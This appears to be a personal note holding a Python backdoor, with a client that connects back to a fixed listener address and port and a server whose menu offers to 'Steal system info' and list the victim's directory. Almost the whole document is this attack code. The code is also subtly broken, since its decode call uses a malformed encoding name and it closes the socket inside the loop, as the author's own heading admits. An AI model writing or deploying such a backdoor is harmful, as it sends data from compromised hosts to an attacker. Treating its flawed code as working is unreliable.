### sortof works but only for 1 operation
#backdoor
Client
```python
import os
from socket import *
from os import *
from platform import *

pwd = getcwd()
sys = system()

  
diritems = listdir()

SRV_ADDR = "192.168.73.1"
SRV_PORT = 44444

  

sock = socket(AF_INET,SOCK_STREAM)
sock.connect((SRV_ADDR, SRV_PORT))
print("Waiting for order")

while True:
    data = sock.recv(1024)
    if (data.decode("utf-8)") == "1"):
        msg = '--System info Sent --\n' + sys
        sock.sendall(msg.encode())
        print(data.decode('utf-8'))
    elif (data.decode("utf-8)") == "2"):
        msg = '--Directory sent --\n' + pwd
        sock.sendall(msg.encode())
        print(data.decode('utf-8'))
    sock.close()
```

Server
```python
from socket import *


SRV_ADDR = input("Enter servers address: ")
SRV_PORT = int(input("enter port num: "))
  
sock = socket(AF_INET,SOCK_STREAM)
  

sock.bind((SRV_ADDR, SRV_PORT))
sock.listen(1)

print("Awaiting retrieval...")
connection, address = sock.accept()

print("Client connected")

while True:
    action = input("""Choose what to do:

    1: Steal system info

    2: Check dir contents

    3: Close conenction

    """)

    connection.sendall(action.encode())
    data = connection.recv(1024)

    if not data: break
    print(data.decode("utf-8"))
    print("*"*40)
connection.close()
```